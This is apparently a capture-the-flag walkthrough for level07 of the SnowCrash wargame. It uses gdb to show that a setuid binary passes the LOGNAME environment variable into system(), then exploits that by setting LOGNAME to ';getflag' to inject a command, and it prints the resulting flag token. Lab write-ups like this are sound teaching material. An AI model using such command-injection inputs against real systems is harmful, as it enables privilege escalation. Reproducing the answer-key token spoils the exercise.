# SnowCrash

## Level07

```sh
level07@SnowCrash:~$ ls -l
total 12
-rwsr-sr-x 1 flag07 level07 8805 Mar  5  2016 level07
```
```sh
level07@SnowCrash:~$ ./level07
level07
```

```sh
(gdb) disas main
Dump of assembler code for function main:
	...
   0x08048567 <+83>:    movl   $0x0,0x14(%esp)
   0x0804856f <+91>:    movl   $0x8048680,(%esp)
   0x08048576 <+98>:    call   0x8048400 <getenv@plt> #Retrieve env variable 
   0x0804857b <+103>:   mov    %eax,0x8(%esp)
   0x0804857f <+107>:   movl   $0x8048688,0x4(%esp)
   0x08048587 <+115>:   lea    0x14(%esp),%eax
   0x0804858b <+119>:   mov    %eax,(%esp)
   0x0804858e <+122>:   call   0x8048440 <asprintf@plt> #Creating a string containing the command
   0x08048593 <+127>:   mov    0x14(%esp),%eax
   0x08048597 <+131>:   mov    %eax,(%esp)
   0x0804859a <+134>:   call   0x8048410 <system@plt> #Execute the command
   0x0804859f <+139>:   leave
   0x080485a0 <+140>:   ret
End of assembler dump.
```

In x86 calling convention, function arguments are pushed onto the stack before calling the function
So we can now what is the value sent to getenv by checking $0x8048680,(%esp) since %esp represent the top of the stack and $0x8048680 represent the value stored into the stack that will be used by getenv

We can use the x command to check the value of 0x8048600 in order to retrieve the env variable name

```sh
(gdb) x 0x8048680
0x8048680:       "LOGNAME"
```

Let's try to change the value of LOGNAME in order to execute the getflag command

```
level07@SnowCrash:~$ export LOGNAME=";getflag"
level07@SnowCrash:~$ ./level07

Check flag.Here is your token : fiumuikeil55xe9cu4dood66h
```